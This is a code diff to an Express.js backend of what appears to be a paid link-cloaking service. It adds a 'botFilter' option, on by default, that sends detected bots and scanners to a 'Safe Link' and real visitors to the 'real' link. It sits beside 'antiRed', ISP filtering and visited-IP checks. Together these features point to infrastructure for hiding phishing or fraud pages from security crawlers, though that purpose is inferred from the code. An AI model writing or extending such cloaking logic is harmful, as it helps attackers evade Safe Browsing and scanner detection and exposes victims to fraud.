@@ -1484,7 +1484,7 @@ async function findActiveConflict(slug, excludeUserId) {
 }
 
 app.post('/api/links', requireAuth, apiLimiter, asyncHandler(async (req, res) => {
-    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited, duration, allowAfrica, allowEurope } = req.body;
+    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited, duration, allowAfrica, allowEurope } = req.body;
 
     const prices = { '3days': 15, '1week': 25, '2weeks': 50, 'month': 80 };
     const price = prices[duration];
@@ -1536,6 +1536,7 @@ app.post('/api/links', requireAuth, apiLimiter, asyncHandler(async (req, res) =>
         slug: newSlug,
         antiRed: antiRed !== undefined ? antiRed : true,
         ispFilter: ispFilter !== undefined ? ispFilter : true,
+        botFilter: botFilter !== undefined ? botFilter : true,
         mobileIsps: mobileIsps || req.user.settings.mobileIsps,
         reallowVisited: reallowVisited !== undefined ? reallowVisited : true,
         allowAfrica: allowAfrica !== undefined ? allowAfrica : false,
@@ -1553,7 +1554,7 @@ app.post('/api/links', requireAuth, apiLimiter, asyncHandler(async (req, res) =>
 }));
 
 app.post('/api/links/bulk', requireAuth, apiLimiter, asyncHandler(async (req, res) => {
-    const { text, duration, antiRed, ispFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope } = req.body;
+    const { text, duration, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope } = req.body;
 
     const prices = { '3days': 15, '1week': 25, '2weeks': 50, 'month': 80 };
     const pricePerUnit = prices[duration];
@@ -1622,6 +1623,7 @@ app.post('/api/links/bulk', requireAuth, apiLimiter, asyncHandler(async (req, re
             slug: newSlug,
             antiRed: antiRed !== undefined ? antiRed : true,
             ispFilter: ispFilter !== undefined ? ispFilter : true,
+            botFilter: botFilter !== undefined ? botFilter : true,
             mobileIsps: mobileIsps || req.user.settings.mobileIsps,
             reallowVisited: reallowVisited !== undefined ? reallowVisited : true,
             allowAfrica: allowAfrica !== undefined ? allowAfrica : false,
@@ -1670,7 +1672,7 @@ app.delete('/api/links/:slug', requireAuth, asyncHandler(async (req, res) => {
 
 app.put('/api/links/:oldSlug', requireAuth, apiLimiter, asyncHandler(async (req, res) => {
     const { oldSlug } = req.params;
-    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope } = req.body;
+    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope } = req.body;
 
     if (!name || !realLink || !nonRealLink) {
         return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
@@ -1710,6 +1712,7 @@ app.put('/api/links/:oldSlug', requireAuth, apiLimiter, asyncHandler(async (req,
         slug: newSlug,
         antiRed: antiRed !== undefined ? antiRed : links[index].antiRed,
         ispFilter: ispFilter !== undefined ? ispFilter : links[index].ispFilter,
+        botFilter: botFilter !== undefined ? botFilter : links[index].botFilter,
         mobileIsps: mobileIsps !== undefined ? mobileIsps : links[index].mobileIsps,
         reallowVisited: reallowVisited !== undefined ? reallowVisited : links[index].reallowVisited,
         allowAfrica: allowAfrica !== undefined ? allowAfrica : links[index].allowAfrica,
@@ -1939,6 +1942,7 @@ async function handleRedirection(user, req, res, linkData) {
 
     const { settings, forcedIps, blockedIps, visitedIps } = user;
     const clientIp = getClientIp(req);
+    const isVisited = Array.isArray(visitedIps) && visitedIps.some(v => v.ip === clientIp);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const countryHeader = getClientCountry(req);
 
@@ -1959,6 +1963,7 @@ async function handleRedirection(user, req, res, linkData) {
     const nonRealLink = linkData.nonRealLink || settings.nonRealLink;
     const useAntiRed = linkData.antiRed !== undefined ? linkData.antiRed : settings.antiRed;
     const useIspFilter = linkData.ispFilter !== undefined ? linkData.ispFilter : settings.ispFilter;
+    const useBotFilter = linkData.botFilter !== undefined ? linkData.botFilter : (settings.botFilter !== undefined ? settings.botFilter : true);
     const useMobileIsps = linkData.mobileIsps || settings.mobileIsps;
     const useReallowVisited = linkData.reallowVisited !== undefined ? linkData.reallowVisited : settings.reallowVisited;
     const useAllowAfrica = linkData.allowAfrica !== undefined ? linkData.allowAfrica : (settings.allowAfrica !== undefined ? settings.allowAfrica : false);
@@ -2004,7 +2009,7 @@ async function handleRedirection(user, req, res, linkData) {
     let targetUrl = realLink;
     let redirectReason = null;
 
-    if (isBot(req)) {
+    if (useBotFilter && isBot(req)) {
         targetUrl = nonRealLink;
         redirectReason = 'Bot Detection';
     } else if (isVisited && !useReallowVisited) {
